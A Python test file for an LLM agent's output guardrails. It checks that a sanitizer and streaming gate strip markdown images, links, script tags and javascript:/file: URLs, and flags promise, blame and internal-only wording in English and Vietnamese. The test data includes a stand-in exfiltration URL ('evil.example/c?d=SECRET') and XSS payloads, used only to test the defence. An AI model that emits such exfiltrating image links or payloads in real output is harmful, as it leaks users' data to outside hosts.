"""M2: what a model's text may carry into a person's browser, streamed or not."""

from __future__ import annotations

import pytest
from pydantic import BaseModel

from investigator.agents.investigation.schemas import Finding
from investigator.agents.investigation.subgraphs.response import (
    grounding_violations,
    tone_violations,
)
from investigator.connectors import EvidenceRecord
from investigator.guardrails import (
    GuardedLlm,
    GuardPolicy,
    GuardRuntime,
    MemoryAuditSink,
)
from investigator.guardrails.output.patterns import BLAME, INTERNAL, PROMISE
from investigator.guardrails.output.sanitize import UrlPolicy, sanitize, urls_in
from investigator.guardrails.output.stream_gate import StreamGate
from investigator.llm import ChatMessage, Message, TextDelta
from tests.fakes import ScriptedLlm, text_turn

EVIL = "https://evil.example/c?d=SECRET"
GOOD = "https://acme.atlassian.net/browse/HPF-19"


@pytest.mark.parametrize(
    ("text", "expected"),
    [
        (f"see ![x]({EVIL})", "see [image removed]"),
        ("![alt][ref]", "[image removed]"),
        (f"[report]({EVIL})", "report"),
        (f"[report]({GOOD})", f"[report]({GOOD})"),
        ("[report](https://acme.atlassian.net/browse/X?token=1)", "report"),
        ("[click](javascript:alert(1))", "click"),
        ("[x](data:text/html;base64,AAAA)", "x"),
        ("[x](file:///etc/passwd)", "x"),
        ("a <script>alert(1)</script> b", "a alert(1) b"),
        ('<img src="https://evil.example/p.png">', ""),
        ("<!-- hi --> done", " done"),
        (f"open <{EVIL}>", "open [link removed]"),
        (f"go to {EVIL}.", "go to [link removed]."),
        (f"go to {GOOD}.", f"go to {GOOD}."),
        ("[1]: https://evil.example/x\ntext", "\ntext"),
        ("[E:jira:HPF-19] says so", "[E:jira:HPF-19] says so"),
        ("mail <PERSON_1> and a < b > c", "mail <PERSON_1> and a < b > c"),
        ("**bold** and `code` and [a](#anchor)", "**bold** and `code` and a"),
    ],
)
def test_sanitize_table(text: str, expected: str) -> None:
    assert sanitize(text)[0] == expected


def test_an_address_the_model_was_given_may_be_repeated() -> None:
    given = f"The ticket is at {EVIL} per the email."
    pol = UrlPolicy(allowed=urls_in([given]))
    assert sanitize(f"[ticket]({EVIL})", pol)[0] == f"[ticket]({EVIL})"
    assert sanitize("[ticket](https://evil.example/c?d=OTHER)", pol)[0] == "ticket"


def test_findings_say_what_was_removed() -> None:
    _, found = sanitize(f"![x]({EVIL}) [a]({EVIL}) <script>")
    assert [f.kind for f in found] == ["image", "link", "html"]
    assert found[0].detail == "evil.example"


SAMPLES = [
    f"Intro ![pixel]({EVIL}) outro. See [doc]({GOOD}) and [bad]({EVIL}) done.",
    f"Line one\n[ref]: {EVIL}\nline [two][ref] end",
    f"Text {EVIL} and {GOOD}, then <img src='{EVIL}'> and <b>ok</b>.",
    "Cites [E:a] and [E:b](not a link) and ![](x) final!",
    "plain text only, with a < b and c > d and 3 * 4 = 12.",
    "[x]: http://a.example/1\n[y]: http://b.example/2\nbody",
    "javascript:alert(1) and data:text/plain,hi and https://x.example/a?b=c.",
    "trailing bang !",
    "line\n![a](http://z.example/q?x=1)\n\n[b](http://z.example/n)",
]


@pytest.mark.parametrize("text", SAMPLES)
def test_stream_gate_gives_the_same_text_however_it_is_cut(text: str) -> None:
    pol = UrlPolicy(allowed=frozenset({GOOD}))
    whole = sanitize(text, pol)[0]

    def run(pieces: list[str]) -> str:
        gate = StreamGate(pol)
        return "".join(gate.feed(p) for p in pieces) + gate.flush()

    assert run([text]) == whole
    assert run(list(text)) == whole  # one character at a time
    for i in range(len(text) + 1):
        assert run([text[:i], text[i:]]) == whole, i
    for size in (2, 3, 5, 7):
        assert run([text[i : i + size] for i in range(0, len(text), size)]) == whole


def test_the_gate_never_lets_a_partial_image_through() -> None:
    gate = StreamGate()
    emitted = ""
    for piece in ["Look: !", "[a]", "(https://evil.", "example/x?d=1)", " done"]:
        out = gate.feed(piece)
        assert "evil" not in out and "![" not in out
        emitted += out
    emitted += gate.flush()
    assert emitted == "Look: [image removed] done"


# ---- through the choke point -------------------------------------------------------


def guard(output: str = "enforce") -> tuple[GuardRuntime, MemoryAuditSink]:
    sink = MemoryAuditSink()
    return GuardRuntime.for_tests(GuardPolicy(output=output), sink), sink  # type: ignore[arg-type]


MSG = [ChatMessage(role="user", content=f"The ticket is {GOOD}")]
LEAK = f"Result ![p]({EVIL}) and [a]({EVIL}) and [t]({GOOD})."


async def test_streamed_answer_is_clean_in_every_piece_and_in_the_final_turn() -> None:
    rt, sink = guard()
    llm = GuardedLlm(ScriptedLlm([text_turn(LEAK)]), rt)
    pieces = []
    final = None
    async for item in llm.stream_with_tools(MSG, []):
        if isinstance(item, TextDelta):
            pieces.append(item.text)
        else:
            final = item
    assert final is not None
    streamed = "".join(pieces)
    assert "evil" not in streamed and "evil" not in final.message.content
    assert streamed == final.message.content
    assert f"[t]({GOOD})" in streamed
    kinds = [e.rule for e in sink.events]
    assert kinds.count("image") == 1 and "link" in kinds
    assert all(e.enforced for e in sink.events)


async def test_monitor_mode_reports_but_does_not_change_the_text() -> None:
    rt, sink = guard("monitor")
    turn = await GuardedLlm(ScriptedLlm([text_turn(LEAK)]), rt).complete_with_tools(
        MSG, []
    )
    assert turn.message.content == LEAK
    assert sink.events and not any(e.enforced for e in sink.events)


async def test_off_mode_does_nothing() -> None:
    rt, sink = guard("off")
    turn = await GuardedLlm(ScriptedLlm([text_turn(LEAK)]), rt).complete_with_tools(
        MSG, []
    )
    assert turn.message.content == LEAK and not sink.events


class Note(BaseModel):
    title: str = ""
    items: list[str] = []


async def test_structured_output_is_cleaned_field_by_field() -> None:
    rt, sink = guard()
    note = Note(title=f"![x]({EVIL})", items=["fine", f"[a]({EVIL})"])
    llm = GuardedLlm(ScriptedLlm(structured={Note: note}), rt)
    got, _ = await llm.complete_structured([Message(role="user", content="q")], Note)
    assert got.title == "[image removed]" and got.items == ["fine", "a"]
    assert note.title.startswith("![")  # the original object is untouched
    assert {e.rule for e in sink.events} == {"image", "link"}


async def test_clean_structured_output_is_returned_as_is() -> None:
    rt, sink = guard()
    note = Note(title="fine")
    llm = GuardedLlm(ScriptedLlm(structured={Note: note}), rt)
    got, _ = await llm.complete_structured([Message(role="user", content="q")], Note)
    assert got is note and not sink.events


# ---- shared EN + VI wording --------------------------------------------------------


@pytest.mark.parametrize(
    "text",
    [
        "Chúng tôi cam kết hoàn thành trước thứ Sáu.",
        "Đảm bảo sẽ xong trong tuần này.",
        "Sẽ hoàn tiền trước ngày 15.",
        "We guarantee delivery.",
    ],
)
def test_promises_in_both_languages(text: str) -> None:
    assert PROMISE.search(text)


@pytest.mark.parametrize(
    "text",
    [
        "Đây là lỗi của đội vận hành.",
        "Do phía khách hàng gửi chậm.",
        "Có sự sơ suất ở bước kiểm tra.",
        "This was their fault.",
    ],
)
def test_blame_in_both_languages(text: str) -> None:
    assert BLAME.search(text)


@pytest.mark.parametrize(
    "text", ["Ghi chú nội bộ: không chia sẻ.", "Tài liệu bảo mật.", "internal-only"]
)
def test_internal_markers_in_both_languages(text: str) -> None:
    assert INTERNAL.search(text)


@pytest.mark.parametrize(
    "text",
    [
        "Chúng tôi sẽ theo dõi và cập nhật cho anh.",
        "Cảm ơn anh đã liên hệ. Chúng tôi đang kiểm tra.",
        "The team is confirming the status.",
    ],
)
def test_ordinary_wording_is_not_flagged(text: str) -> None:
    assert not (BLAME.search(text) or PROMISE.search(text) or INTERNAL.search(text))


def test_a_draft_with_a_leftover_placeholder_or_a_new_link_fails() -> None:
    assert "contains an unresolved placeholder" in tone_violations(
        "Dear <PERSON_2>, we are checking.", []
    )
    ev = EvidenceRecord(
        id="e1", source="email", title="t", excerpt=f"See {GOOD} for the ticket."
    )
    f = Finding(
        id="f1",
        title="t",
        claim="c",
        explanation="",
        status="verified",
        reasoning_type="direct",
        supporting_evidence_ids=["e1"],
    )
    ok = grounding_violations(f"The ticket is at {GOOD}.", [f], [ev])
    assert not any("link" in v for v in ok)
    bad = grounding_violations(f"See {EVIL} for details.", [f], [ev])
    assert any("link or image address" in v for v in bad)
    assert "contains an image" in grounding_violations("![x](a)", [f], [ev])
